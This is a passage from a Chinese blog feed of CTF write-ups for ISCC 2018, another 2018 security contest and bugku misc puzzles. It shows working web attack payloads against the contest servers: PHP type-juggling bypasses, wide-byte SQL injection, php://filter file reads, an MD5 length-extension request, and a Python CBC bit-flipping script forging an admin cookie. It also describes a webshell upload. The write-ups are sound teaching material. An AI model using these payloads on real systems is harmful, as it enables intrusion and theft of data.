alt=""></p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_POST[&#39;username&#39;])&amp;isset($_POST[&#39;password&#39;])){     $username = $_POST[&#39;username&#39;];     $password = $_POST[&#39;password&#39;]; } else{     $username=&quot;hello&quot;;     $password=&quot;hello&quot;; } if(md5($password) == 0){     echo &quot;xxxxx&quot;; } show_source(__FILE__); ?&gt;</code></pre><p>md5</p><p>password=240610708</p><p>跳转</p><pre><code class="php">&lt;?php include &#39;flag.php&#39;; $a = @$_REQUEST[&#39;a&#39;]; @eval(&quot;var_dump($$a);&quot;); show_source(__FILE__); ?&gt;</code></pre><p>$$a 这个东西很诡异。其实就是php中变量可以当作另一个变量的变量名 </p><p><strong>$GLOBALS</strong> — 引用全局作用域中可用的全部变量</p><p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。</p><p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>这里介绍一个php中的特殊变量: <code>$GLOBALS</code>，它的作用如下： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805170011_680.png" alt=""></p><p> 所以我们可以利用<code>$GLOBALS</code>输出flag的值，故payload： </p><p><a href="http://118.190.152.202:8005/no_md5.php?a=GLOBALS" target="_blank" rel="external">http://118.190.152.202:8005/no_md5.php?a=GLOBALS</a></p><p>ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4} </p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>在url传参username和password得到界面提示有index.php.txt文件</p><p>所以访问<a href="http://118.190.152.202:8017/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8017/index.php.txt</a></p><p>得到源码</p><pre><code>&lt;?phperror_reporting(0);$flag = &quot;***********&quot;;    if(isset($_GET[&#39;username&#39;])){    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){    $a = fla;    echo &quot;very good!Username is right&quot;;    }    else{    print &#39;Username is not right&lt;!--index.php.txt--&gt;&#39;;}}elseprint &#39;Please give me username or password!&#39;;if (isset($_GET[&#39;password&#39;])){    if (is_numeric($_GET[&#39;password&#39;])){        if (strlen($_GET[&#39;password&#39;]) &lt; 4){            if ($_GET[&#39;password&#39;] &gt; 999){            $b = g;            print &#39;&lt;p&gt;very good!Password is right&lt;/p&gt;&#39;;        }else             print &#39;&lt;p&gt;Password too little&lt;/p&gt;&#39;;        }else        print &#39;&lt;p&gt;Password too long&lt;/p&gt;&#39;;    }else    print &#39;&lt;p&gt;Password is not numeric&lt;/p&gt;&#39;;}if ($a.$b == &quot;flag&quot;)    print $flag;?&gt;</code></pre><p>分析</p><pre><code>if(isset($_GET[&#39;username&#39;])){    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){    $a = fla;    echo &quot;very good!Username is right&quot;;</code></pre><blockquote><p>strcasecmp(string1,string2)</p><p> 参数 str1第一个字符串。str2第二个字符串。</p><p>如果 str1 小于 str2 返回 &lt; 0；</p><p> 如果 str1 大于 str2 返回 &gt; 0；</p><p>如果两者相等，返回 0。 </p></blockquote><p>可以使用username数组绕过</p><pre><code>if (is_numeric($_GET[&#39;password&#39;])){        if (strlen($_GET[&#39;password&#39;]) &lt; 4){            if ($_GET[&#39;password&#39;] &gt; 999){            $b = g;</code></pre><p>必须通过3位数字，但大于999</p><p><a href="http://52.10.107.64:8002/?password=4e3" target="_blank" rel="external">?password=4e3</a> </p><p><a href="http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3" target="_blank" rel="external">http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3</a> </p><p>flag{ISCC2018_Very_GOOD!} </p><p>Reference：</p><p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md</a></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p>注入点:个人信息栏</p><p>发现页面编码是gb2312，可能是宽字节注入，检验一下<code>id=1%df&#39;--+</code>，返回正常页面，确定是宽字节注入 </p><pre><code>id=1%df&#39; or 1=1  order by 8--+  id=1%df&#39; or 1=1  order by 9--+id=-1%df&#39; union select 1,2,3,4,5,6,7,8--+    id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(table_name),8 from information_schema.tables where table_schema = database() --+  id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(column_name),8 from information_schema.columns where table_name = 0x61646d696e73 --+ id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(flag),8 from admins --+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080049_453.png" alt=""></p><p> Flag：Y0u_@<a href="https://github.com/33w_dxxmn_9rf0Od" target="_blank" rel="external">@33w_dxxmn_9rf0Od</a> </p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php</a></p><p>打开题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140857_654.png" alt=""></p><p>查看源码<img src="http://oy0tigw51.bkt.clouddn.com/201805140858_867.png" alt=""></p><p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140901_199.png" alt=""></p><p>大概可以猜测 文件包含漏洞，尝试</p><pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php</code></pre><p>但是不行</p><p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p><p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;,&#39;Off&#39;);include(&#39;config.php&#39;);$img = $_GET[&#39;img&#39;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&#39;jpg&#39;) !== false)    {        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)        {            die(&#39;File not found.&#39;);        }        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&#39;Content-Type: image/jpeg&#39;);        $data = get_contents($img);        echo $data;    }    else    {        die(&#39;File not found.&#39;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><ol><li>开头包含了config.php</li><li>img必须有jpg但又不能有resource=.*jpg</li><li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li></ol><p>知道了config.php再去访问明白为什么必须包含jpg</p><pre><code class="php">&lt;?phpfunction get_contents($img){        if(strpos($img,&#39;jpg&#39;) !== false)        {                return file_get_contents($img);        }        else        {                header(&#39;Content-Type: text/html&#39;);                return file_get_contents($img);        }}?&gt;</code></pre><p>最终payload:</p><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p><!-- flag{1ntere5ting_PHP_Regu1ar_express1onssssss} --><h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><pre><code>&lt;?phpinclude &quot;secret.php&quot;;@$username=(string)$_POST[&#39;username&#39;];function enc($text){    global $key;    return md5($key.$text);}if(enc($username) === $_COOKIE[&#39;verify&#39;]){    if(is_numeric(strpos($username, &quot;admin&quot;))){        die($flag);    }    else{        die(&quot;you are not admin&quot;);    }}else{    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);}show_source(__FILE__);</code></pre><ol><li>一个不知道的$key，但是从cookie中可以知道它的长度是46</li><li>从cookie中知道md5(\$key.guest) 的值，也就是知道enc(\$username) 符合条件的值</li><li>获得flag 的条件，满足enc(\$username) == md5(\$key.guest)，同时\$username 要含有admin</li></ol><p>使用HashPump攻击； </p><p>安装HashPump；</p><p> 方法一： git clone <a href="https://github.com/bwall/HashPump.git" target="_blank" rel="external">https://github.com/bwall/HashPump.git</a> apt-get install g++ libssl-dev cd HashPump make make install B.方法二： pip install hashpumpy </p><p>方法二:</p><p>pip install hashpumpy </p><pre><code>$ hashpump -s &#39;78cfc57d983b4a17e55828c001a3e781&#39; -d &#39;guest&#39; -a &#39;admin&#39; -k 465f585093a7fe86971766c3d25c43d0ebguest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</code></pre><p>POST / HTTP/1.1<br>Host: 118.190.152.202:8002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Cookie: verify=5f585093a7fe86971766c3d25c43d0eb; len=46<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 58</p><p>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</p><p>ISCC{MD5_1s_n0t_5afe}</p><p><a href="http://p0sec.net/index.php/archives/99/" target="_blank" rel="external">http://p0sec.net/index.php/archives/99/</a></p><p><a href="http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="external">http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more</a></p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p><pre><code class="php">&lt;?phpinclude &#39;sqlwaf.php&#39;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}// 使用aes-128-cbc 模式加密function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;    die();}// 解密cipherfunction check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {  $username=waf((string)$_POST[&#39;username&#39;]);  $password=waf((string)$_POST[&#39;password&#39;]);  if($username === &#39;admin&#39;){        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出    }else{        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p><ol><li>s:2:{s:8:”userna</li><li>me”;s:5:”Admin”;</li><li>s:8:”password”;s</li><li>:5:”admin”;}</li></ol><p>要第二组的b变为d 就要第一组的u改变 </p><p>python脚本：</p><pre><code class="python">import urllib,base64,requests,reurl = &quot;http://118.190.152.202:8001/index.php&quot;datas = {    &quot;username&quot; : &quot;Admin&quot;,    &quot;password&quot; : &quot;admin&quot;}r = requests.post(url,data=datas)cipher = r.cookies.get(&quot;cipher&quot;)cipher = base64.b64decode(urllib.unquote(cipher))offset = 9new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.get(url,cookies=new_cookies)plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))old = plain[:len(iv)]new = &#39;a:2:{s:8:&quot;userna&#39;new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=new_cookies)print(r3.text)</code></pre><p>看其他师傅的其他解题：</p><p><a href="https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd</a>  </p><p><a href="https://www.anquanke.com/post/id/146063" target="_blank" rel="external">https://www.anquanke.com/post/id/146063</a></p><p><a href="https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250" target="_blank" rel="external">https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h3 id=&quot;What-is-that？&quot;&gt;&lt;a href=&quot;#What-is-that？&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://mang0.me/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>全国网络空间安全技术大赛2018三道wp</title>
    <link href="http://mang0.me/archives/ceb4048b/"/>
    <id>http://mang0.me/archives/ceb4048b/</id>
    <published>2018-05-15T11:04:17.000Z</published>
    <updated>2018-10-15T00:40:51.591Z</updated>
    
    <content type="html"><![CDATA[<h1 id="全国网络空间安全技术大赛2018三道wp"><a href="#全国网络空间安全技术大赛2018三道wp" class="headerlink" title="全国网络空间安全技术大赛2018三道wp"></a>全国网络空间安全技术大赛2018三道wp</h1><h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><p>得到一张图片</p><p>binwalk 发现是zip加密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121134_772.png" alt=""></p><p>直接修改后缀.zip</p><p>打开压缩包之后发现需要解压密码</p><p>猜测是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p><pre><code>java -jar ZipCenOp.jar r xxx.zip</code></pre><p>得到一个txt</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121128_864.png" alt=""></p><p>一开始以为是base64解码 把除了最后一行的==删除 去解码发现是乱码，知道思路不对 ，后来想起xdctf出过一到base64隐写</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121124_544.png" alt=""></p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201810141056_335.png" alt=""></p><p>举个例子(base64)：</p><p>源文本：T h e</p><p>对应ascii码:84 104 101</p><p>8位binary：01010100 01101000 01100101</p><p>6位binary：010101 000110 100001 100101</p><p>高位补0：000010101 00000110 00100001 00100101</p><p>对应ascii码：21 6 33 37</p><p>查表：V G h l</p><h4 id="隐写原理"><a href="#隐写原理" class="headerlink" title="隐写原理"></a>隐写原理</h4><p>A对应的二进制位为01000001，补全之后为01000001    0000，对应的base64的编码为QQ（010000     010000），所以之后有两个‘=’。在解码的时候我就要在去掉=对应的6个零的同时在去掉4个0，也就是解码的时候会解析01000001而不是010000010000。这时候我们会发现了，我们去掉的这四个0是不是可以用来隐藏信息？？？反正解码的时候会被裁剪掉，那我干脆就在后面做一些手脚，用base64来混淆视听。 </p><pre><code class="python">#!/usr/bin/python#coding:utf-8b64chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:    bin_str = &#39;&#39;    for line in f.readlines():        stegb64 = &#39;&#39;.join(line.split())        rowb64 =  &#39;&#39;.join(stegb64.decode(&#39;base64&#39;).encode(&#39;base64&#39;).split())        offset = abs(b64chars.index(stegb64.replace(&#39;=&#39;,&#39;&#39;)[-1])-b64chars.index(rowb64.replace(&#39;=&#39;,&#39;&#39;)[-1]))        equalnum = stegb64.count(&#39;=&#39;) #no equalnum no offset        if equalnum:            bin_str += bin(offset)[2:].zfill(equalnum * 2)        print &#39;&#39;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组</code></pre><p>可以看这个师傅写的：<a href="https://www.tr0y.wang/2017/06/14/Base64steg/" target="_blank" rel="external">https://www.tr0y.wang/2017/06/14/Base64steg/</a></p><p><a href="https://github.com/amor-tsai/php_screw.git" target="_blank" rel="external">https://github.com/amor-tsai/php_screw.git</a></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开一个登陆界面 ，</p><p>先注册，进入 右上角有个修改密码 猜测是任意密码重置</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131624_405.png" alt=""></p><p>提示flag在flag.php里</p><p>抓包发现自己的Mang0被base64加密 然后url编码</p><p>所以想到username更改admin尝试密码重置逻辑问题。</p><p>username=YWRtaW4%3D</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130011_460.png" alt=""></p><p>发现密码重置成功，进入登陆界面 登陆成功</p><p>发现页面叫我们填写远程图片地址，一开始尝试上传木马地址，然后上传木马图片但是都没有用处，问题在哪里呢</p><p>思考发现会不会ssrf漏洞， 让服务器自己伪造请求，</p><p>后将地址改成本地的flag.php</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130048_442.png" alt=""></p><p>得到 两个图片地址第二个图片是我们上传的，但是被解析就是jgp,</p><p>无法利用所以利用点在于第一幅图片。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130049_141.png" alt=""></p><p>访问第一幅图片地址，下载下来 得到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130049_976.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130050_718.png" alt=""></p><p>保存图片得到flag</p><h2 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h2><p>git源码泄露，</p><p>githack工具下载源码审计</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131640_57.png" alt=""></p><p>upload很奇怪</p><p>进入查看，谷歌查询<a href="http://0day5.com/archives/4022/" target="_blank" rel="external">http://0day5.com/archives/4022/</a></p><p>存在免认证登录漏洞</p><p>访问<a href="http://117.34.116.192/upload.php" target="_blank" rel="external">http://117.34.116.192/upload.php</a></p><p>burp抓包改cookie</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131648_158.png" alt=""></p><p>进入</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131650_741.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131650_29.png" alt=""></p><p>上传文件包含</p><p><a href="http://117.34.116.192/index.php?file=./img/img26019845.jpg" target="_blank" rel="external">http://117.34.116.192/index.php?file=./img/img26019845.jpg</a></p><p>index.php 会把这jpg解析成php运行</p><p>菜刀连接得到fl4g.php</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131810_848.png" alt=""></p><p>需要php反编译，得到原始代码</p><p>flag{7cb3d823105433606ccac8fb75aed67c}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;全国网络空间安全技术大赛2018三道wp&quot;&gt;&lt;a href=&quot;#全国网络空间安全技术大赛2018三道wp&quot; class=&quot;headerlink&quot; title=&quot;全国网络空间安全技术大赛2018三道wp&quot;&gt;&lt;/a&gt;全国网络空间安全技术大赛2018三道wp&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://mang0.me/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>bugku-misc</title>
    <link href="http://mang0.me/archives/e36e397d/"/>
    <id>http://mang0.me/archives/e36e397d/</id>
    <published>2018-05-01T11:02:14.000Z</published>
    <updated>2018-10-15T00:40:51.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bugku-misc"><a href="#bugku-misc" class="headerlink" title="bugku misc"></a>bugku misc</h1><p>做了iscc2018发现自己misc能力差很多，也忘了很多，这周做了bugku misc，总结一下。</p><h3 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h3><p>直接文本编辑器打开；文本末尾发现了一行转义序列： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281525_944.png" alt=""></p><blockquote><p>Unicode编码有以下四种编码方式：</p><p>源文本： <code>The</code></p><p>&amp;#x [Hex]： <code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></p><p>&amp;# [Decimal]： <code>&amp;#00084;&amp;#00104;&amp;#00101;</code></p><p>\U [Hex]： <code>\U0054\U0068\U0065</code></p><p>\U+ [Hex]： <code>\U+0054\U+0068\U+0065</code></p></blockquote><p>unicode——&gt;acsii</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281343_354.png" alt=""></p><p>key{you are right}</p><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><p>先来了解一下png的头文件。</p><p><code>89 50 4E 47 0D 0A 1A 0A</code> ——&gt;PNG头部署名域，表示这是一个PNG图片</p><p><code>00 00 00 0D</code> ——-&gt;描述IHDR头部的大小</p><p><code>49 48 44 52</code> ——&gt;是Chunk Type Code, 这里Chunk Type Code=IHDR</p><p><code>F9 7D AA 93</code> ——&gt;对IHDR的CRC校验</p><p><code>00 00 01 F4</code> ——&gt;图像宽度，500像素</p><p><code>00 00 01 A4</code> ——&gt;图像高度。</p><p>png的标志就是IHDR</p><p><a href="https://blog.csdn.net/joqian/article/details/8290389" target="_blank" rel="external">https://blog.csdn.net/joqian/article/details/8290389</a></p><p>下载rar文件，打开得到一张图片。</p><p>我们把它放到kali中，用binwalk分析一下。  </p><p>发现只是一张图片而已。但这时候发现一个问题，这张图片并不能打开。 </p><p>winhex打开最后从图片格式入手，更改其高度得到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281627_225.png" alt=""></p><p>将A4改为F4</p><p>BUGKU{a1e5aSA}</p><p>winhex的png原理：<a href="http://blog.csdn.net/bisword/article/details/2777121" target="_blank" rel="external">http://blog.csdn.net/bisword/article/details/2777121</a></p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>1.追踪TCP流</p><p>2.根据题目提示查看telnet协议，一个个找下去，在第41个数据包找到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281647_239.png" alt=""></p><h3 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h3><p>WinHex 常见文件头</p><blockquote><p>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only]<br>(eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript. (eps.or.ps)，文件头：252150532D41646F6265<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p></blockquote><p>改后缀为zip进行解压，得到一个word文档，但是打开是乱码</p><p>winhex打开</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281655_885.png" alt=""></p><p>所以是zip文件 从新将.doc 改成.zip</p><p>word文件夹里发现里面有个名为document的文件 ，在里面的document.xml发现flag </p><p>flag{F1@g}</p><h3 id="又一张图片，还单纯吗？？"><a href="#又一张图片，还单纯吗？？" class="headerlink" title="又一张图片，还单纯吗？？"></a>又一张图片，还单纯吗？？</h3><p>用binwalk检测发现还有一张图片把图片提取出来，就是flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804292329_656.png" alt=""></p><h3 id="猜"><a href="#猜" class="headerlink" 